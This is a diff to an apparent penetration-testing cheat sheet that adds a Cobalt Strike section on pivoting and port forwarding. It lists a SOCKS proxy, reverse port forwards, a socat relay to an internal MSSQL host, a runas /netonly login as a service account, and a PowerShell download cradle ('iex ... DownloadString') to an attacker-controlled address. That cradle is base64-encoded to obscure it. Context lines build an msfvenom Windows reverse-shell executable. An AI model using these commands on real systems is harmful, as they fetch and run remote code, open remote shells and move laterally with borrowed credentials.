@@ -1,4 +1,17 @@
 ### Reverse Port Forwarding
+
+### Cobalt Strike
+
+```
+socks 1080
+rportfwd 8080 192.168.100.100 80
+proxychains socat TCP4-Listen:1433,fork TCP:192.168.100.199:1433
+runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
+PS C:\Users\Commando> $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://192.168.100.111:8080/a')"
+PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
+```
+
+
 ### Window Reverse Port Forward
 ```
 msfvenom -p windows/x64/shell_reverse_tcp  LHOST=pivotalBox LPORT=2222 -f exe -o Ninja.exe
